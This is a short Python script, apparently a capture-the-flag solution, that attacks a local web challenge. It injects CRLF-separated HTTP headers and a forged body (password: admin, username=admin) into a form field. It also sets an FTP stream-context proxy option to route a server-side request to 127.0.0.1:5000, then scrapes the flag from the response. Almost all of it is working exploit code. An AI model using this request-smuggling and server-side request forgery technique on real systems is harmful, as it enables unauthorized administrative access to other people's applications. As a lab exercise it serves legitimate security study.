import requests
import re

challenge_link = "http://127.0.0.1"

# First request
r1 = requests.post(challenge_link, data={"name": "test", "hello": "hello"})
print(r1.text)

# Second request
r2 = requests.post(
    challenge_link,
    data={
        "name": "flag HTTP/1.1\r\npassword: admin\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length: 66\r\n\r\nusername=admin&a=",
        "hello": "hello",
        "protocol": "ftp",
        'options': '{"ftp":{"proxy":"tcp://127.0.0.1:5000"}}'
    }
)

# Extract with regex
match = re.search(r"<div class='greeting-output'>(.*?)</div>", r2.text)
if match:
    print("Extracted flag:", match.group(1))
else:
    print("Flag not found in response.")
